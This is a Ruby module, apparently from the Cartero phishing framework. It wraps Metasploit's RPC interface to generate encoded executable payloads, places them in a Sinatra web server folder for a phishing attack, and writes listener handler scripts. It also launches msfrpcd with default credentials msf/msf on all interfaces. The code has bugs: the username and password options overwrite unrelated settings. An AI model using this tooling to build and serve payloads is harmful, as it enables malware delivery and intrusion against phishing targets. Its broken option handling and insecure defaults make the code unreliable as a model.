#encoding: utf-8
module Cartero
module Payloads
# Documentation for MSFVenom < ::Cartero::Payload
class MSFVenom < ::Cartero::Payload

  description(
    name: "Metasploit MSFVenon RPC Interface",
    description: "This command is a home-made implementation of metasploit's msfvenon over metasploit's RPC protocol. " +
                 "This allows us to generate and serve msf payloads, even from remote metasploit instances.",
    author: ["Matias P. Brutti <matias [©] section9labs.com>"],
    type: "Payload",
    license: "LGPL",
    references: ["https://section9labs.github.io/Cartero"]
  )

  def initialize
    super do |opts|
      opts.on("-W", "--webserver WEBSERVER_FOLDER", String,
        "Sets the sinatra WebServer full path for payload creation") do |path|
        @options.path = path
        app = path.split('/')[-1]
        @options.customwebserver = path + '/' + app + ".rb"
        @options.views = path + "/views"
        @options.public_folder = path + "/static"
      end

      opts.on("-T", "--attack-type ATTACK", String,
        "Cartero attack type") do |p|
        @options.attack_type = p
      end

      opts.on("-R", "--request-path PATH", String,
        "Cartero webserver custom request path for attack.") do |p|
        @options.request_path = p
      end

      opts.separator ""
      opts.separator "msfvenom options:"

      opts.on("-m","--payload MSF_PAYLOAD", String,
        "Sets payload type") do |payload|
        @options.msfpayload = payload
      end

      opts.on("-e", "--encoder ENCODER", String,
        "Sets payload encoder") do |encoder|
        @options.msfencoder = encoder
      end

      opts.on("-a", "--arch ARCH", String,
        "Sets payload architecture") do |arch|
        @options.msfarch = arch
      end

      opts.on("-f", "--format FORMAT", String,
        "Sets payload format") do |f|
        @options.msfformat = f
      end

      opts.on("-o", "--options MSF_OPTIONS", String,
        "Sets payload options") do |opt|
        @options.msfoptions = opt
      end

      opts.on("-n","--name NAME", String,
        "Sets payload name (default=download[.exe])") do |name|
        @options.msfname = name
      end

      opts.on("--list COMMAND", String,
        "List payloads, encoders, nops") do |cmd|
        @options.command = "list"
        @options.list = cmd
      end

      opts.separator ""
      opts.separator "metasploit options:"

      opts.on("--start-msfrpcd", "Starts background RPC Server.") do
        @options.command = "start_rpc"
      end

      opts.on("--stop-msfrpcd", "Stops background RPC Server.") do
        @options.command = "stop_rpc"
      end

      opts.on("--host HOST", String,
        "Sets address for RPC client/server") do |host|
        @options.host = host
      end

      opts.on("--port PORT", String,
        "Sets port for RPC client/server") do |port|
        @options.port = port
      end

      opts.on("--username USERNAME", String,
        "Sets username for RPC client/server") do |opt|
        @options.msfoptions = opt
      end

      opts.on("--password PASSWORD", String,
        "Sets password for RPC client/server") do |name|
        @options.msfname = name
      end
    end
  end
  attr_accessor :path
  attr_accessor :webserver
  attr_accessor :msfpayload
  attr_accessor :msfvenom
  attr_accessor :msfname
  attr_accessor :msfarch
  attr_accessor :msfencoder
  attr_accessor :list
  attr_accessor :command
  attr_accessor :msfformat

  def setup
    if @options.msfpayload.nil? && @options.command.nil?
      raise StandardError, "A payload [--payload] must be provided"
    end

    # Only if we are not running a basic command :-)
    if @options.command.nil?
      unless File.exist?(File.expand_path(@options.customwebserver))
        raise StandardError, "Custom WebServer file does not exists."
      end
      # Setting Default / Custom Sinatra Server.
      if @options.customwebserver.nil?
        puts "Payloads & handlers will be saved to current path"
      else
        @path = @options.path
      end
    end

    @payload 			= @options.payload
    @msfpayload 	= @options.msfpayload
    @msfoptions 	= @options.msfoptions
    @msfencoder 	= @options.msfencoder
    @msfname 			= @options.msfname
    @msfformat		= @options.msfformat
    @command      = @options.command
    @list 				= @options.list
    @attack_type 	= @options.attack_type
    @request_path = @options.request_path
    @path 				= @options.path

    setup_rpc_client if command != "start_rpc"
  end

  def run
    run_command if command
    run_msfpayload if msfpayload
  end

  private

  def setup_rpc_client
    require 'cartero/metasploit'
    @rpc_client = ::Cartero::Metasploit.new({
      "host" => @options.host || ::Cartero::GlobalConfig['metasploit']['host'] || '0.0.0.0',
      "port" => @options.port || ::Cartero::GlobalConfig['metasploit']['port'].to_i || 45678,
      "username" => @options.username ||Cartero::GlobalConfig['metasploit']['username'] || 'msf',
      "password" => @options.password ||Cartero::GlobalConfig['metasploit']['password'] || 'msf'
      })
    @rpc_client.login
  end

  def run_command
    case command
    when "list"
      @rpc_client.list(list)
    when "start_rpc"
      system("msfrpcd -U #{@options.username ||Cartero::GlobalConfig['metasploit']['username'] || 'msf'}" +
        " -P #{@options.password ||Cartero::GlobalConfig['metasploit']['password'] || 'msf'} " +
        " -a #{@options.host || ::Cartero::GlobalConfig['metasploit']['host'] || '0.0.0.0'} " +
        " -p #{@options.port || ::Cartero::GlobalConfig['metasploit']['port'] || '45678'}"
      )
    when "stop_rpc"
      #Ghetto call - Not sure this is the best way to kill things :( Could not find anything else as of now.
      @rpc_client.call("core.stop")
    else
      puts "Command Not supported. You should not be here. "
    end
  end

  def run_msfpayload
    name = msfname || (msfpayload =~ /windows/ ? 'download.exe' : 'download')
    if path
      Dir.mkdir path + '/payload' unless File.directory? path + '/payload'
      payload_name = path + '/payload/' + name
      handler_name = path + "/payload/#{name}_handler.rc"
    else
      payload_name = './' + name
      handler_name = './' + "#{name}_handler.rc"
    end

    begin
      @rpc_client.generate_payload( @options.msfpayload ,
      {
        "Encoder"			=> msfencoder || "x86/shikata_ga_nai",
        "Format"			=> msfformat || "exe",
        "Iterations"	=> 3,
        "Space"				=> 480,
        "Arch" 				=> @options.msfarch,
        "filepath" 		=> payload_name,
        "datastore"  	=> @options.msfoptions
      })

    rescue StandardError => e
      $stderr.puts e.message
    end

    puts "Payload saved as #{payload_name}"
    File.open(handler_name, "w") do |x|
      x << @rpc_client.generate_listener_script(@options.msfpayload, @options.msfoptions )
    end
    puts "MSF handler script saved as #{handler_name}"
  end
end
end
end
